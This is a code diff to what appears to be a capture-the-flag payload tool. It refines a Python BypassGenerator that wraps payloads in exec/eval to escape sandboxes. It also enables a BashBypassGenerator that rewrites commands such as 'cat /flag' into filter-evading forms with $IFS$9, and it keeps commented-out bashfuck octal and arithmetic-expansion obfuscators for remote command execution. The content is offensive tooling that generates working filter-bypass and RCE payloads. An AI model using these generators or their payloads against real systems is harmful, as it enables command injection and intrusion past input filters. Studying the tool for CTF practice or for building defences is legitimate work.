@@ -120,7 +120,7 @@ def recursion_protection(func):
         try:
             output = func(self, payload[0])
             if isinstance(output, str):
-                return replace_redundant_char(func(self, payload[0]))
+                return replace_redundant_char(output)
             else:
                 return output
         except RecursionError:
@@ -267,26 +267,27 @@ class BypassGenerator:
                     return output  # in case of the challenge is easy
             tmp = copy(output)
             for i in tmp:
-                if self.find_object(exec, self.local_scope):
-                    output.extend(
-                        BypassGenerator(
-                            [self.repr_to_exec(i), {}],
-                            self.allow_unicode_bypass,
-                            self.local_scope,
-                            _allow_after_tagging_bypassers=False,
-                            search_depth=1,  # This will occupy too much CPU usage, so 1 depth
-                        ).generate_bypasses()
-                    )
-                if self.find_object(eval, self.local_scope):
-                    output.extend(
-                        BypassGenerator(
-                            [self.repr_to_eval(i), {}],
-                            self.allow_unicode_bypass,
-                            self.local_scope,
-                            _allow_after_tagging_bypassers=False,
-                            search_depth=1,  # This will occupy too much CPU usage, so 1 depth
-                        ).generate_bypasses()
-                    )
+                if len(i) < 50:
+                    if self.find_object(exec, self.local_scope):
+                        output.extend(
+                            BypassGenerator(
+                                [self.repr_to_exec([i, {}]), {}],
+                                self.allow_unicode_bypass,
+                                self.local_scope,
+                                _allow_after_tagging_bypassers=False,
+                                search_depth=1,  # This will occupy too much CPU usage, so 1 depth
+                            ).generate_bypasses()
+                        )
+                    if self.find_object(eval, self.local_scope):
+                        output.extend(
+                            BypassGenerator(
+                                [self.repr_to_eval([i, {}]), {}],
+                                self.allow_unicode_bypass,
+                                self.local_scope,
+                                _allow_after_tagging_bypassers=False,
+                                search_depth=1,  # This will occupy too much CPU usage, so 1 depth
+                            ).generate_bypasses()
+                        )
         output = remove_duplicate(output)
         return output
 
@@ -1326,104 +1327,96 @@ class BypassGenerator:
         ast.fix_missing_locations(transformed_tree)
         return ast.unparse(transformed_tree)
 
+class BashBypassGenerator:
+    """
+    Bypasser only for RCE bash commands.
+    'cat /flag' -> 'cat$IFS$9/flag'
+    """
+    def emit(self, payload: str) -> str:
+        return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
+    def blank_to_ifs(self, payload: str) -> str:
+        """
+        ' ' -> $IFS$9
+        """
+        return payload.replace(" ", "$IFS$9")
 
-# TO BE CONTINUED
-# class BashBypassGenerator:
-#     """
-#     Bypasser only for RCE bash commands.
-#     'cat /flag' -> 'cat$IFS$9/flag'
-#     """
-#     def blank_to_ifs(self, payload: str) -> str:
-#         """
-#         '' -> $IFS$9
-#         """
-#         return payload.replace(" ", "$IFS$9")
+    # the below are modified from program bashfuck
+    # https://github.com/ProbiusOfficial/bashFuck
+    # Copyright @ ProbiusOfficial, 2025
 
-#     # the below are modified from program bashfuck
-#     # https://github.com/ProbiusOfficial/bashFuck
-#     # Copyright @ ProbiusOfficial, 2025
-
-#     def get_oct(self, c):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
-#         return (oct(ord(c)))[2:]
-
-
-#     def nomal_otc(self, cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
-#         payload = '$\''
-#         for c in cmd:
-#             payload += '\\' + self.get_oct(c)
-#         payload += '\''
-#         return payload
-
-#     def common_otc(self, cmd):
-#         payload = '$\''
-#         for c in cmd:
-#             if c == ' ':
-#                 payload += '\' $\''
-#             else:
-#                 payload += '\\' + self.get_oct(c)
-#         payload += '\''
-#         return payload
+    def get_oct(self, c):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
+        return (oct(ord(c)))[2:]
 
 
-#     def bashfuck_x(self, cmd, form):
-#         bash_str = ''
-#         for c in cmd:
-#             bash_str += f'\\\\$(($((1<<1))#{bin(int(self.get_oct(c)))[2:]}))'
-#         payload_bit = bash_str
-#         payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
-#         payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
-#         if form == 'bit':
-#             payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
-#             return payload_bit
-#         elif form == 'zero':
-#             payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
-#             return payload_zero
-#         elif form == 'c':
-#             payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
-#             return payload_c
+    # def nomal_otc(self, cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
+    #     if ' ' not in cmd:
+    #         payload = '$\''
+    #         for c in cmd:
+    #             payload += '\\' + self.get_oct(c)
+    #         payload += '\''
+    #         return self.emit(payload)
+    #     # else return None in this func
+
+    # def common_otc(self, cmd):
+    #     payload = '$\''
+    #     for c in cmd:
+    #         if c == ' ':
+    #             payload += '\' $\''
+    #         else:
+    #             payload += '\\' + self.get_oct(c)
+    #     payload += '\''
+    #     return self.emit(payload)
+
+    # def bashfuck_x(self, cmd, form):
+    #     bash_str = ''
+    #     for c in cmd:
+    #         bash_str += f'\\\\$(($((1<<1))#{bin(int(self.get_oct(c)))[2:]}))'
+    #     payload_bit = bash_str
+    #     payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
+    #     payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
+    #     if form == 'bit':
+    #         payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
+    #         return self.emit(payload_bit)
+    #     elif form == 'zero':
+    #         payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
+    #         return self.emit(payload_zero)
+    #     elif form == 'c':
+    #         payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
+    #         return self.emit(payload_c)
 
 
-#     def bashfuck_y(self, cmd):
-#         oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
-#             '$(())',  # 0
-#             '$((~$(($((~$(())))$((~$(())))))))',  # 1
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
-#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
-#         ]
-#         bashFuck = ''
-#         bashFuck += '__=$(())'  # set __ to 0
-#         bashFuck += '&&'  # splicing
-#         bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'
+    # def bashfuck_y(self, cmd):
+    #     oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
+    #         '$(())',  # 0
+    #         '$((~$(($((~$(())))$((~$(())))))))',  # 1
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
+    #         '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
+    #     ]
+    #     bashFuck = ''
+    #     bashFuck += '__=$(())'  # set __ to 0
+    #     bashFuck += '&&'  # splicing
+    #     bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'
 
-#         for c in cmd:
-#             bashFuck += '\\\\'
-#             for i in self.get_oct(c):
-#                 bashFuck += oct_list[int(i)]
+    #     for c in cmd:
+    #         bashFuck += '\\\\'
+    #         for i in self.get_oct(c):
+    #             bashFuck += oct_list[int(i)]
 
-#         bashFuck += '\\\''
+    #     bashFuck += '\\\''
 
-#         return bashFuck
-
-
-#     def Generate(self, cmd):
-#         print("Command: " + cmd)
-#         print("Payload generated as follows:")
-#         print(self.common_otc(cmd))
-#         print(self.bashfuck_x(cmd, 'bit'))
-#         print(self.bashfuck_x(cmd, 'zero'))
-#         print(self.bashfuck_x(cmd, 'c'))
-#         print(self.bashfuck_y(cmd))
+    #     return self.emit(bashFuck)
 
 
-#     def main(self):
-#         print("This program is used to generate Payload for Bash to execute the given command. The program uses Bash's arithmetic and parameter extension capabilities to generate different forms of Payload to improve the chance of Bypass.")
-#         print("Author: Github@Probius_Official")
-#         cmd = input("input your command:")
-#         self.Generate(cmd)
-
-#     if __name__ == '__main__':
-#         main()
+    def Generate(self, cmd):
+        yield cmd
+        # yield self.nomal_otc(cmd)
+        yield self.blank_to_ifs(cmd)
+        # yield self.common_otc(cmd)
+        # yield self.bashfuck_x(cmd, 'bit')
+        # yield self.bashfuck_x(cmd, 'zero')
+        # yield self.bashfuck_x(cmd, 'c')
+        # yield self.bashfuck_y(cmd)
